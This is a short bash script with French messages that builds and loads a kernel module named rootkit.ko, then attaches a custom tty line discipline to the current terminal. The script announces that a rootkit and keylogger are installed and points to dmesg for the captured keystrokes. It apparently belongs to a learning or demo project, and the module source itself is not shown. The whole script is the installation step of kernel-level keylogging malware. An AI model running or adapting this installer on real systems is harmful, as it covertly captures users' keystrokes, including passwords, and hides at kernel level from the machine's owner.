#!/bin/bash

set -e  # Arrête en cas d'erreur

KERNEL_DIR=kernel
USER_DIR=user
DEVICE=$(tty)

echo "[*] Compilation du module kernel..."
make -C /lib/modules/$(uname -r)/build M=$(pwd)/$KERNEL_DIR modules

echo "[*] Compilation du programme utilisateur..."
gcc -Wall -O2 -o $USER_DIR/set_ldisc $USER_DIR/set_ldisc.c

echo "[*] Insertion du module kernel..."
sudo insmod $KERNEL_DIR/rootkit.ko || {
    echo "[!] Échec du chargement du module kernel"
    exit 1
}

echo "[*] Application de la line discipline à $DEVICE..."
sudo ./$USER_DIR/set_ldisc $DEVICE || {
    echo "[!] Échec du changement de line discipline"
    exit 1
}

echo "[+] Rootkit installé et keylogger activé."
echo "[+] Tu peux taper du texte ici, appuie sur ENTRÉE pour logguer."
echo "[+] Vérifie les logs avec : sudo dmesg | tail -n 20"
